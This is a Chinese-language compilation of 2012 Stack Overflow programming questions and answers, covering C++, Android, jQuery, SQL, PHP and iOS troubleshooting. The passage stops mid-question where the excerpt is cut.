是否有某种方法可以避免 _popen 冻结需要输入的命令的情况？

这里是运行_popen的进程的代码

```
char readBuff[8096];
DWORD readed;
ReadFile(pipe,readBuff,8096,&readed,NULL);
FILE * out=_popen(commandToExec,"r"); //assume commandToExec contains "date" 
char buffer[128];
char output[8096];
output[0]='\0';
while(fgets(buffer, 128, out)){
    snprintf(output,8096,"%s%s\n",outputComando,buffer);
}
DWORD writed;
WriteFile(pipe,outputComando,8096,&scritti,NULL); //it writes the output to a pipe 
```

这在仅输出命令上工作正常，但它永远不会在需要输入的命令上到达“while”（我调试过它）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:38:17.697

根据 popen 上的 msdn 页面，您需要额外的工作来重定向 stdin 和 stout

[http://msdn.microsoft.com/en-us/library/ms682499.aspx](http://msdn.microsoft.com/en-us/library/ms682499.aspx)

# ios - 将 kml 加载中的大量点添加到 Google 我的地图，然后保存它们

> ID：10338778
> 
> 赞同：0
> 
> 时间：2012-04-26T17:54:23.280
> 
> 标签：ios, google-maps, kml

我有一个使用公共 UI 加载到 Google 地图中的 kml 文件。然后我在我的地图中创建了一张地图，现在我想保存所有显示的标记（有数百个）。

我没有找到一种方法来做到这一点，只需单击每个地图标记并将其保存到我的地图和我的新地图。

有没有办法将它们全部批量保存到我的新地图中？

我希望这只是一个“doh”时刻，但我没有看到它。

我计划从我的 IOS 应用程序链接到这些预制地图，该应用程序也使用 Mapkit。

# c# - OpenFileDialog 过滤器在 Windows 7 上不起作用

> ID：10338785
> 
> 赞同：1
> 
> 时间：2012-04-26T17:54:48.577
> 
> 标签：c#, wpf, filter, openfiledialog

我在 OpenFileDialog 上设置了以下过滤器：

```
MyApp Files (*.ced, *.cdr, *.wrp, *.wrap, *.out) | *.ced; *.cdr; *.wrp; *.wrap; *.out | All Files (*.*) | *.* 
```

问题是 .out 文件没有出现。难道我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:24:23.967

想通了，我不得不像这样删除分号之间的空格：

```
MyApp Files (*.ced, *.cdr, *.wrp, *.wrap, *.out) |*.ced;*.cdr;*.wrp;*.wrap;*.out| All Files (*.*) | *.* 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:12:07.833

用以下内容替换您的过滤器表达式，应该可以解决问题

```
OpnefileDlg.Filter = "(*.ced, *.cdr, *.wrp, *.wrap) | *.ced, *.cdr, *.wrp, *.wrap | All Files (*.*) | *.*"; 
```

# c++ - 在 Mac 上的 Xcode 中使用 C++ 中的堆栈、队列和链表的最简单方法是什么？

> ID：10338788
> 
> 赞同：0
> 
> 时间：2012-04-26T17:55:01.810
> 
> 标签：c++, stl, std

我的教授向我介绍了 STL（他目前不使用 Mac）。通过谷歌搜索，我发现 STL 已被弃用多年。目前最容易做到这一点的方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:59:15.353

STL 是标准库 (STD) 某些部分的前身。有时该术语用于指代这些部分。

要使用堆栈，`#include <stack>`. 还有`<list>`和`<queue>`，还有很多其他的。

这是一个很好的参考网站：[http ://en.cppreference.com/w/](http://en.cppreference.com/w/)

和往常一样，一本好书：[权威 C++ 书籍指南和列表](https://stackoverflow.com/questions/388242/the-definitive-c-book-guide-and-list)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:02:38.783

您正在阅读[这篇维基百科文章](http://en.wikipedia.org/wiki/C%2B%2B_Standard_Library)，其中指出`#include <*.h>`（旧的 C 库）已被弃用。

# java - 通过 JDBC / JPA 在 PostgreSQL 中更新插入（更新+插入）返回奇怪的行数

> ID：10338789
> 
> 赞同：0
> 
> 时间：2012-04-26T17:55:02.413
> 
> 标签：java, sql, postgresql, jpa, jdbc

我正在使用“upsert”，我需要知道它是否创建了新行。SQL 的形式为：

```
update mytable set col1='value1' where (col2='value2');
insert into mytable select 'value1', 'value2' where not exists (select 1 from mytable where (col2='value2')); 
```

如果我在 Postgres 中运行它，它会返回第二条语句的受影响行数。即“1 行受影响”如果它执行插入，“0 行受影响”如果它执行更新。这是我所期望的。

但是，如果我使用 javax.persistence.Query 对象在 JDBC+JPA 上运行它，我会得到相反的行为：如果它执行更新，则返回 1，而插入则返回 0。

Java 行为是否可靠？即我可以对此进行编码，还是可能会随着驱动程序 jar 的未来版本而改变？

有没有更好的方法来编写 upsert，以便我还可以获取有关它执行了哪个操作的信息？

版本详情：我使用的是PostgreSQL 9.1，Java 6，JDBC驱动jar是postgresql-9.1-901.jdbc4.jar

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:47:22.970

在 Java 中，您应该能够根据 JDBC API 文档获取每个语句的行数：

[http://docs.oracle.com/javase/6/docs/api/java/sql/Statement.html#execute%28java.lang.String%29](http://docs.oracle.com/javase/6/docs/api/java/sql/Statement.html#execute%28java.lang.String%29)

PostgreSQL 文档提供了一个在 plpgsql 函数中完成的示例：

[http://www.postgresql.org/docs/9.1/interactive/plpgsql-control-structures.html#PLPGSQL-ERROR-TRAPPING](http://www.postgresql.org/docs/9.1/interactive/plpgsql-control-structures.html#PLPGSQL-ERROR-TRAPPING)

查找 merge_db() 代码示例。

# c# - 获取自定义构建工具来创建 C# 文件

> ID：10338799
> 
> 赞同：0
> 
> 时间：2012-04-26T17:55:38.993
> 
> 标签：c#, visual-studio-2008, msbuild

我正在尝试让协议缓冲区与该 protobuf-csharp-port 一起使用。我想通过添加 .proto 文件并使用自定义工具进行自动构建，然后获取 .cs 文件。对于自定义工具，我被指示从 csharp-test 包中获取 CmdTool 并注册它。

那行得通，但是然后运行我得到的工具

```
System.InvalidOperationException: Before a project can be instantiated, Engine.BinPath 
must be set to the location on disk where MSBuild is installed. This is used to evaluate 
$(MSBuildBinPath).
at Microsoft.Build.Shared.ErrorUtilities.ThrowInvalidOperation(String resourceName, Object[] args)
at Microsoft.Build.BuildEngine.Project..ctor(Engine engine)
at CSharpTest.Net.CustomTool.VsInterop.CmdTool.GenerateCode(String defaultNamespace, 
  String inputFileName) in e:\Projects\Library\Tools\CmdTool\VsInterop\CustomTool.cs:line 50 
```

我已经脱离了我的元素，似乎找不到任何线索该做什么，或者如何让 $(MSBuildBinPath) 或 Engine.BinPath 发生。

或者，即使有一种不太复杂的方法可以让 Progen 从 F7 运行，那也很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-30T23:24:21.737

我在 Visual Studio 2008 中遇到了完全相同的问题。我与该工具的作者合作以获得解决方案，他的步骤对我有用。

1.  下载 Nuget 包“Csharptest.net.tools”

2.  运行“tools/net40/CmdTool.exe注册”

3.  重启 VStudio

# php - 如何从 PHP 获取调试打印输出？

> ID：10338800
> 
> 赞同：0
> 
> 时间：2012-04-26T17:55:47.367
> 
> 标签：php

我无权访问 apache 服务器或服务器上运行的任何东西。我只有一个虚拟主机的免费帐户。我显然可以访问 .htaccess 文件，但我不确定我是否足够安全地使用“螺母和螺栓”。因此，我尝试在我的 php 脚本中启用调试打印输出，如下所示：

```
error_reporting(E_ALL); 
```

我没有看到任何错误，但我知道存在错误，因为整个脚本没有执行。

有没有一种简单的方法可以让错误打印输出显示在 php 返回的代码中？如果我尝试对 .htaccess 进行调整，我将在那里做什么？它只有 36 个字节长。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-26T17:56:55.587

做：

```
error_reporting(E_ALL);
ini_set('display_errors',"On"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:08:16.767

您也可以尝试[debug_backtrace()](http://php.net/manual/en/function.debug-backtrace.php)。

```
var_dump(debug_backtrace()); 
```

# android - 为什么我的 youtube 在 webview 中只播放声音？

> ID：10338801
> 
> 赞同：4
> 
> 时间：2012-04-26T17:55:50.437
> 
> 标签：android, webview, youtube

我的代码运行，我可以听到声音。但是，视频只是黑屏。这是我的代码：

```
 myWebView = (WebView) mLinearLayout.findViewById(R.id.webView);
    myWebView.setWebChromeClient(new WebChromeClient());
    myWebView.setWebViewClient(wvClient);
    myWebView.getSettings().setJavaScriptEnabled(true);
    myWebView.getSettings().setPluginsEnabled(true);
    myWebView.loadUrl("http://www.youtube.com/watch?v=pYkLG0KoUfM"); 
```

我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:08:40.680

如果移动设备没有配置闪存，则可能无法播放视频，您将看到一个空白屏幕。

确保您的 Flash 播放器在设备上配置正确，并且该设备确实支持 Flash 播放器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T20:04:27.040

或者尝试 youtubes 嵌入具有 html5 后备的 url 格式。

```
myWebView = (WebView) mLinearLayout.findViewById(R.id.webView);
myWebView.setWebChromeClient(new WebChromeClient());
myWebView.setWebViewClient(wvClient);
myWebView.getSettings().setJavaScriptEnabled(true);
myWebView.getSettings().setPluginsEnabled(true);
myWebView.loadUrl("http://www.youtube.com/embed/pYkLG0KoUfM"); 
```

[http://apiblog.youtube.com/2010/07/new-way-to-embed-youtube-videos.html](http://apiblog.youtube.com/2010/07/new-way-to-embed-youtube-videos.html)

如果您使用新的嵌入代码样式，您的观众将能够在我们的 Flash 或 HTML5 播放器中观看您的嵌入视频，具体取决于他们的观看环境和偏好。我们的 HTML5 设置页面上列出了支持 HTML5 视频播放器的环境。在不支持 HTML5 的情况下（例如，我们的 HTML5 播放器无法播放带有广告的视频），我们使用 Flash。

新嵌入样式的另一个好处是它最终将允许嵌入在移动设备上工作，移动设备通常使用内置播放器而不是 Flash 或 HTML5。

在我们让这个新的嵌入代码成为我们普通用户的标准之前，我们想给我们的开发者社区一个预览。虽然可能有一些限制，但请尝试一下，让我们知道它是如何进行的。

# tsql - SQL Server 2000 TOP 和 OUTPUT 关键字

> ID：10338811
> 
> 赞同：0
> 
> 时间：2012-04-26T17:56:17.367
> 
> 标签：tsql, sql-server-2000

此查询在 SQL Server 2005 和 2008 中运行良好。我将如何在 SQL Server 2000 中编写它？

```
UPDATE TOP 10 myTable
SET myBooleanColumn = 1
OUTPUT inserted.* 
```

除了运行多个查询之外，还有什么办法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T18:26:01.580

老实说，您的查询并没有真正的意义，我很难理解您的“伟大”标准。当然，它会更新 10 行，并且不会出错。但是你真的不在乎它更新了哪 10 行吗？您当前`TOP`没有`ORDER BY`建议您希望 SQL Server 决定要更新哪些行（这正是它要做的）。

要在 SQL Server 2000 中完成此操作（不使用触发器），我认为您需要执行以下操作：

```
SET NOCOUNT ON;

SELECT TOP 10 key_column
INTO #foo
FROM dbo.myTable
ORDER BY some_logical_ordering_clause;

UPDATE dbo.MyTable
SET myBooleanColumn = 1
FROM #foo AS f
WHERE f.key_column = dbo.MyTable.key_column;

SELECT * FROM dbo.MyTable AS t
INNER JOIN #foo AS f
ON t.key_column = f.key_column; 
```

如果你想要一个简单的查询，那么你可以有这个触发器：

```
CREATE TRIGGER dbo.upd_tr_myTable
ON dbo.myTable
FOR UPDATE
AS
BEGIN
  SET NOCOUNT ON;

  SELECT * FROM inserted;
END
GO 
```

请注意，此触发器无法判断您是在执行 TOP 10 更新还是其他内容，因此所有用户在执行更新时都会获得此结果集。即使您在 IF UPDATE(myBooleanColumn) 上进行过滤，其他用户仍可能更新该列。

在任何情况下，您仍然需要修复更新语句，以便知道要更新哪些行。（你甚至可以考虑一个`WHERE`子句。）

# node.js - node.js 肥皂示例客户端无法运行

> ID：10338815
> 
> 赞同：1
> 
> 时间：2012-04-26T17:56:26.210
> 
> 标签：node.js, soap, client

```
node client_soap.js 

node.js:249
        throw e; // process.nextTick error, or 'error' event on first tick
              ^
Error: Cannot find module './http'
    at Function._resolveFilename (module.js:333:15)
    at Function._load (module.js:280:25)
    at Module.require (module.js:357:17)
    at require (module.js:373:17)
    at Object.<anonymous> (/home/a1/mysourc3e/client_soap.js:6:12)
    at Module._compile (module.js:444:26)
    at Object..js (module.js:462:10)
    at Module.load (module.js:351:32)
    at Function._load (module.js:309:12)
    at module.js:482:10

npm list
/home/a1/mysourc3e
└─┬ soap@0.1.3 
  ├── node-expat@1.5.0 
  └── request@2.2.6 
```

我正在尝试使用肥皂运行 node.js 的示例代码。我无法让[https://github.com/milewise/node-soap/blob/master/lib/client.js](https://github.com/milewise/node-soap/blob/master/lib/client.js)工作。我从哪里获得模块？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T19:52:00.023

使用`require('http')`而不是`require('./http')`.

[HTTP 模块是内置在 node 中的](http://nodejs.org/docs/latest/api/http.html#http_http)，所以你不应该告诉加载器在当前目录中查找它（就像 " `./`" 前缀所做的那样）。

# android - Android 中类似于文本区域的“电影片尾”

> ID：10338821
> 
> 赞同：1
> 
> 时间：2012-04-26T17:56:59.727
> 
> 标签：android, android-layout

我正在尝试在 Android 的布局中添加一个看起来像电影中的演职员表的人员列表：

```
Director ................................. John Doe
Producer ............................... John Smith
Camera ................................... Jane Doe
Screenplay ............................. Jane Smith 
```

我希望点根据屏幕的宽度扩展（以便位置名称将对齐左侧和名称右侧）

有没有办法在布局 xml 中做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:02:49.700

我会那样做 - 伪layout.xml：

```
<frame-layout>
 <text-view text="dots"/>
 <relative-layout>
   <textview align-parent-left="true" padding-right:="5dp" text="role"/>
   <textview align-parent-right="true" padding-left:="5dp" text="name/>
 </relative-layout>
</frame-layout> 
```

这作为列表视图中的一行

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:07:19.403

您可以将整个布局设为垂直方向的 LinearLayout；每行都是一个水平方向的 LinearLayout，包含三个组件：

具有角色名称的 TextView，宽度为 WRAP_CONTENT

带有文本“......”的 TextView（很多点，足以满足所有屏幕），宽度 MATCH_PARENT 和 layout_weight 设置为 1.0

带有人名的 TextView，宽度为 WRAP_CONTENT。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:08:33.277

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
     >> android:layout_height="20dp"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:text="Small Text"
        android:textAppearance="?android:attr/textAppearanceSmall" />

    <TextView
        android:id="@+id/textView2"
        android:layout_width="fill_parent"
    >>  android:layout_height="20dp"
        android:layout_alignParentTop="true"
        android:layout_toRightOf="@+id/textView1"
        android:layout_toLeftOf="@+id/textView3"
        android:text=".........................................................................."
        android:textAppearance="?android:attr/textAppearanceSmall" />

    <TextView
        android:id="@+id/textView3"
        android:layout_width="wrap_content"
    >>  android:layout_height="20dp" // set as u want....
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:text="Small Text"
        android:textAppearance="?android:attr/textAppearanceSmall" />

</RelativeLayout> 
```

# asp.net-mvc-3 - 是否可以在将剃刀视图引擎的输出发送到客户端之前对其进行修改？

> ID：10338822
> 
> 赞同：7
> 
> 时间：2012-04-26T17:57:08.093
> 
> 标签：asp.net-mvc-3, razor

我正在使用 Razor 作为模板语言构建一个 ASP.NET MVC 3 应用程序。

这是我想做的事情：当某个请求的 cshtml 文件中的所有模板内容都已在 razor viewengine 中解析并准备好输出给访问者时 - 然后我想在解析的 html 内容中插入一些额外的信息。

所以我的问题是：在 Razor 视图引擎内部或 MVC 框架内部是否有任何类型的事件允许我对输出进行这种更改？

不要问我为什么要在 MVC 应用程序中做这样的事情，这是一个漫长而无聊的故事。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:05:09.060

鉴于您的问题含糊不清，也许这篇文章可能会有所帮助，或者您可以指定这篇文章没有帮助的方式......

[ASP.Net MVC 视图中的依赖注入](http://lostechies.com/jimmybogard/2010/05/19/dependency-injection-in-asp-net-mvc-views/)

更新：

ActionFilter 怎么样？我似乎记得您可以在 ActionFilter 中获得查看结果并对其进行修改，尽管我只为 json 转换做过这个。这是另一篇文章：[使用 ASP.Net 动作过滤器进行渲染](http://jesschadwick.blogspot.com/2008/07/use-aspnet-mvc-actionfilters-to-render_02.html)

这是一个[答案——这可能是一个重复的问题！](https://stackoverflow.com/a/203850/1284283)

# c++ - c++11：完美转发中的常量

> ID：10338824
> 
> 赞同：3
> 
> 时间：2012-04-26T17:57:15.900
> 
> 标签：c++, c++11

我创建了函数来检测参数的 constness 和 l(r)valueness。

```
template<class T> std::string
detect(typename std::remove_reference<T>::type&&) {
    return std::string(std::is_const<T>::value ? "const " : "") + "rvalue";
}
template<class T> std::string
detect(typename std::remove_reference<T>::type&) {
    return std::string(std::is_const<T>::value ? "const " : "") + "lvalue";
} 
```

出于某种原因，即使在 const 类型（例如 const int&）上，is_const 也总是返回 false。我尝试添加另一个重载来捕获常量

```
template<class T> std::string
detect(const typename std::remove_reference<T>::type& ) { return "const lvalue"; } 
```

然后编译器抱怨当应用于 const int& 时检测不明确。所以我认为编译器已经正确计算出 T=const int&，但为什么 is_const 不返回 true？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-26T18:00:09.890

`std::is_const<T>`仅检测顶级`const`. 像`foo const`，或`foo* const`。它不关心“内部” `const`，比如`foo const*`or `foo const&`。

如果您想要查看是否键入对 const 的引用，则需要先取出引用，因此`const`成为顶级：

```
std::is_const<typename std::remove_reference<T>::type>::value 
```

在任何情况下，显示的函数都不允许类型推导，这意味着您必须`T`显式传递，例如`detect<foo const&>(x)`. 也许你想要类似下面的东西？

```
template<class T> std::string
detect(T&&) { // have T be deduced
    return std::string(std::is_const<typename std::remove_reference<T>::type>::value ? "const " : "")
         + (std::is_lvalue_reference<T>::value? "lvalue" : "rvalue");
} 
```

这可以称为像`detect(x)`。

# javascript - 获取未捕获的类型错误：无法在 js 中读取 null 的属性“左侧”

> ID：10338829
> 
> 赞同：2
> 
> 时间：2012-04-26T17:57:39.123
> 
> 标签：javascript, html

我有这个通过导航栏的 jquery 代码，并且选定的链接周围有一个框。它只适用于中间环节，其他环节无效。有任何想法吗？提前致谢。

```
navigation arrow starts
var $el, leftPos, newWidth,
    $mainNav = $("#nav");

$mainNav.append("<li id='magic-line'></li>");
var $magicLine = $("#magic-line");

$magicLine
    .width($(".current_page_item").width())
    .css("left", $(".current_page_item a").position().left)
    .data("origLeft", $magicLine.position().left)
    .data("origWidth", $magicLine.width());

//scroll arrow

function update_location(){
    $el = $('#nav').children('li.current');
    leftPos = $el.position().left;
    newWidth = $el.width();
    $('#nav li:nth-child(4) a').addClass('button-style');
    if(window.top.scrollY == 0)
    {
        setTimeout(function(){
        $magicLine.stop().animate({
            left: 8,
            width: 355
        });},1000);
        $('#nav li:nth-child(4) a').removeClass('button-style');

    }
    else
    {
        setTimeout(function(){
        $magicLine.stop().animate({
            left: leftPos,
            width: newWidth
        });},1000);
    }
}

$('#magic-line').css('left', '-15px', 'width','411px');
$(window).scroll(function(){
    update_location();
});

    <div class="navbar-fixed-top navbar" >
    <div class="navbar-inner">
        <div class="container">
            <ul class="nav nav-pills pull-right" id="nav">
                <li class="current_page_item" style="width: 355px;"><a href="#home" class="logo" style="display:block; width: 355px;"><img src="images/logo.jpg" class="current_page_item" width="355" alt="" /></a></li>
                <li><a href="#vision">VISION</a></li>
                <li><a href="#services">SCHOOLS</a></li>
                <li><a href="#apply">REQUEST AN EVALUATION</a></li>
                <li><a href="#how-it-works">HOW IT WORKS</a></li>
                <li><a href="#contact-us">CONTACT US</a></li>
            </ul>
        </div>
    </div>
</div> 
```

`leftPos = $el.position().left;`在under之后得到错误`function update_location()`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:01:29.423

我认为您可能打算在这一行使用类 current_page_item 而不是 current：

```
$el = $('#nav').children('li.current'); 
```

$el 是一个空的 jQuery 对象，因此 el.position() 为 null，因此无法读取 null 左侧的属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:03:09.663

那是因为：

```
$el = $('#nav').children('li.current'); 
```

返回空值。

尝试：

```
$el = $('#nav').children('li.current_page_item'); 
```

# ios - iPad 相机连接套件可与非存储 USB 设备通话？

> ID：10338838
> 
> 赞同：3
> 
> 时间：2012-04-26T17:58:04.497
> 
> 标签：ios, ipad, robotics

我正在做一些机器人实验，并且有一个 USB 伺服控制器，我想将它连接到我的 iPad。有谁知道是否可以在 iPad 上访问诸如此类的 USB 设备？如果是这样，我可以使用什么机制与之交谈？伺服控制器的制造商已经开放了控制器的协议，所以如果我能和它交谈，我应该可以使用它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T13:02:31.637

最有可能的是，您将无法直接从 iphone 控制伺服。

伺服是某种[“伺服控制器”的控制器](http://proto-pic.co.uk/pololu-micro-serial-servo-controller-assembled/)

![在此处输入图像描述](../Images/dd751fae687f25b670bc52f0581d0422.png)

该服务器使用 RS232 接口进行控制，该接口接受某种字符或位的命令。

所以我发现[这个 rs-232 应用程序在应用商店看起来很有趣，](http://itunes.apple.com/gb/app/rs232-terminal-for-direct/id348887344?mt=8)但不知道如何使用它？

[但是你可以为 iphone 和 ipad 购买这样的电缆。](http://www.robotshop.com/redpark-iphone-db9-rs232-serial-adapter.html)请记住，RS232 和 TTL 使用不同的电压。

![在此处输入图像描述](../Images/a590e4f3fd4c71f7a79bdebc49421285.png)

无需为 iPhone / iPad 获得更多硬件，而是使用内置[蓝牙和 SPP（串行端口接口）以及一些代码和这个出色的套件（我经常使用它，它很棒）](http://shop.kula.org.uk/index.php?main_page=product_info&cPath=2_6&products_id=9)这只需要一些电源（它可以在TTL@9600bps 不是 RS232，因此请检查电压兼容性）您将其配对并获得适当的虚拟 COM 端口，无需任何特殊编程即可通过蓝牙进行通信！您需要检查您的 iOS 是否允许您使用 SPP 蓝牙配置文件。许多较旧的 iOS 设备都不允许使用蓝牙，因此您可能需要一根电缆。

![在此处输入图像描述](../Images/4692b9c7975e4baf3e5b6ad4462faf4c.png)

*   [这里有一个关于如何在 iOS 上使用串行的好项目](http://devdot.wikispaces.com/Iphone+Serial+Port+Tutorial)
*   这是将[大多数 iPhone / iPad 中包含的蓝牙 HID 与智能设备一起使用的方法，该设备使用蓝牙 SPP 重新传输它](http://serialio.com/support/BlueSnap/BlueSnapBridgeSetup.php).. 呵呵 - 吸那个史蒂夫
*   在这里，[火花乐趣是现成的产品。](http://www.sparkfun.com/products/10938)无论您在 iPhone 上键入什么内容（或使用将字符推送到蓝牙 HID 的程序）都会转换为 TTL...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T12:43:48.820

您可以使用[`ExternalAccessory.framework`](http://developer.apple.com/library/ios/#documentation/ExternalAccessory/Reference/ExternalAccessoryFrameworkReference/_index.html#//apple_ref/doc/uid/TP40008235)及其 API。

还有一个关于[外部附件](http://developer.apple.com/library/ios/#featuredarticles/ExternalAccessoryPT/Introduction/Introduction.html#//apple_ref/doc/uid/TP40009502)的简要指南。

# android - 不要在 if-case 中启动 Activity

> ID：10338846
> 
> 赞同：0
> 
> 时间：2012-04-26T17:59:00.590
> 
> 标签：android, broadcastreceiver

我对这部分代码有疑问

```
Intent myactivity = new Intent(context, MyKeyboard.class);
myactivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                 
context.startActivity(myactivity); 
```

如果我把它放在“如果”中没有任何反应，但如果我把它放在外面它就可以了

```
public class OutgoingCallReceiver extends BroadcastReceiver  {

        public void onReceive(Context context, Intent intent) {
                Bundle bundle = intent.getExtras();

                if(null == bundle) return;

                String phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

                if( phonenumber=="11111111111" ) {

                    Intent myactivity = new Intent(context, MyKeyboard.class);
                    myactivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(myactivity);

                }      

        }

} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T18:00:12.200

```
phonenumber=="11111111111" 
```

用下面替换上面的行并尝试

```
phonenumber.equals("11111111111") 
```

# jquery - FullCalendar 的日历切换未按预期运行

> ID：10338853
> 
> 赞同：0
> 
> 时间：2012-04-26T17:59:12.190
> 
> 标签：jquery, fullcalendar

我正在研究 Adam Shaw (http://arshaw.com/fullcalendar/) 的 FullCalendar 实现。

每个用户都有自己的个人日历，默认通过 JSON 加载：

```
 $('#calendar').fullCalendar({
        header: {
            left: false,
            center: 'title',
            right: false
        },
        editable: false,
        events: 'http://WEBSERVER.com/calendar/json/<?=$gid?>'
    }); 
```

（calendar/json/ 是一个 PHP 文件，它从 MySQL 查询结果生成 JSON）

但是，也有共享日历。可用日历显示为按钮列表，如下所示：

```
 <div class="btn-group" id="cal-lists">
        <div class="btn btn-large" id="1">John's Personal Calendar</div>
        <div class="btn btn-large add-cal" id="2">Company Calendar</div>
        <div class="btn btn-large add-cal" id="3">Confrence Room Calendar</div>
    </div> 
```

然后我有以下应该利用 FullCalendar addEventSource 方法的 jQuery。

```
 $("div.add-cal").click(function()
    {
        var json    = 'http://WEBSERVER.com/calendar/json/';
        var cal     = $(this).attr('id');
        var src     = json+cal;

        $('#calendar').fullCalendar( 'addEventSource', src);

        $(this).removeClass('add-cal');
        $(this).addClass('rem-cal');
    });

    $("div.rem-cal").click(function()
    {
        var json    = 'http://WEBSERVER.com/calendar/json/';
        var cal     = $(this).attr('id');
        var src     = json+cal;

        $('#calendar').fullCalendar( 'removeEventSource', src);

        $(this).removeClass('rem-cal');
        $(this).addClass('add-cal');
    }); 
```

所以每当用户点击

```
 <div class="btn btn-large add-cal" id="2">Company Calendar</div> 
```

应该调用 $("div.add-cal").click(function() 来添加资源，然后将 CSS 类从“add-cal”更改为“rem-cal”。

然后，如果再次单击该按钮，则应调用 $("div.rem-cal").click(function() 。情况并非如此。

单击公司日历不断将公司日历事件添加到显示中。

第一次单击时，类会适当地更改为“rem-cal”，但之后不会更改。因此，如果用户单击它三次，则会显示三个事件实例。

我对 jQuery / JavaScript 不是很好，因此非常感谢任何建议。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:03:01.417

发生这种情况是因为您将事件处理程序绑定到尚未匹配任何内容的选择器。

您需要改用 jQuery 的[`.on()`](http://api.jquery.com/on/)方法。

例如

```
$("div.btn-group")
    .on("click", "div.add-cal", function() {
        ...
    })
    .on("click", "div.rem-cal", function() {
        ...
    }); 
```

# java - android片段可以重复使用吗？

> ID：10338857
> 
> 赞同：1
> 
> 时间：2012-04-26T17:59:19.797
> 
> 标签：java, android, android-fragments

android 片段是否可重用 - 我的意思是如果我可以使用如下代码：

```
class MyTabActivity extends FragmentActivity implements OnClickListener {

    Fragment[] tabs = new Fragment[3];

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.settings_activity);
        findViewById(R.id.button1).setOnClickListener(this);
        findViewById(R.id.button2).setOnClickListener(this);
        findViewById(R.id.button3).setOnClickListener(this);

        //first xml-defined fragment, it is inside  
        //FrameLayout with id R.id.loadTarget -> see openTab()
        tabs[0] = getSupportFragmentManager().findFragmentById(
                R.id.firstFragment);
    }

    private void openTab(int i) {
        final FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
        ft.replace(R.id.loadTarget, getTabFragment(i));
        ft.addToBackStack(null);
        ft.commit();
    }

    private Fragment getTabFragment(int i) {
        if(tabs[i] == null) {
            switch(i) {

                //0-tab fragment has been allready 
                //retrieved in onCreate

                case 1:
                    tabs[1] = new MySecondTabFragment();
                    break;
                case 2:
                    tabs[2] = new MyThirdTabFragment();
                    break;
            }
        }
        return tabs[i];
    }

    @Override
    public void onClick(View v) {
        switch(v.getId()) {
            case R.id.button1:
                openTab(0);
                break;
            case R.id.button2:
                openTab(1);
                break;
            case R.id.button3:
                openTab(2);
                break;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:09:13.787

是的，片段是可重复使用的，您可以多次将片段附加/分离到活动。正如您在分离后的文档中看到的那样，片段被销毁，然后在添加到另一个活动时再次创建。

# sql - 通过 mq v6 调用的 db2 v10 z/os 本机 sql 存储过程

> ID：10338859
> 
> 赞同：1
> 
> 时间：2012-04-26T17:59:34.023
> 
> 标签：sql, db2, ibm-mq

我正在尝试通过内置 mq 侦听器调用 z/os db2 v10 本机 sql 存储过程

我非常接近让它工作，但是响应消息有效负载始终为空，即使我只是将 varchar out 参数设置为固定常量字符串。

cn 任何人都对如何在 z/os 上为 db2 v10 配置内置 mq 侦听器的好资源有所了解？

或者有没有人遇到过这种类型的问题？

我一直在使用 db2 v10 infocentre 和 redbook 非常纯的 xml。

这些显示了 db2mq.send 和 received 调用，但是我认为您不必使用这些命令来发送和接收来自本机存储过程的数据 i/out。

# jsonp - 错误 JSONP 存储

> ID：10338864
> 
> 赞同：0
> 
> 时间：2012-04-26T17:59:47.713
> 
> 标签：jsonp, sencha-touch-2

我正在通过 JSONP 检索列表的信息，并在控制台浏览器中收到以下错误：“意外令牌：”

我的店铺：

```
Ext.define ('Projeto.store.Mural', {
 extend 'Ext.data.Store'
 requires: [
     'Projeto.model.Mural'
 ]

 config: {
     autoLoad: true,
     model: 'Projeto.model.Mural'
     storeId 'MuralStore'
     Proxy {
         type: 'jsonp'
         url: 'http://URL/mural'
         reader: {
             type: 'json',
             rootProperty: 'rows'
         }
     }
 }
}); 
```

我的列表：

```
Ext.define ('Projeto.view.MuralList', {
 extend 'Ext.dataview.List'
 alias: 'widget.murallist'

 config: {
     loadingText: 'Loading ...',
     store: 'MuralStore'
     itemTpl: [
         '<div> Message: {message} </ div>
     ]
 }
 }); 
```

JSON 返回我的 URL：

```
{
 "rows": [
     {
         "lookup": "yyyy"
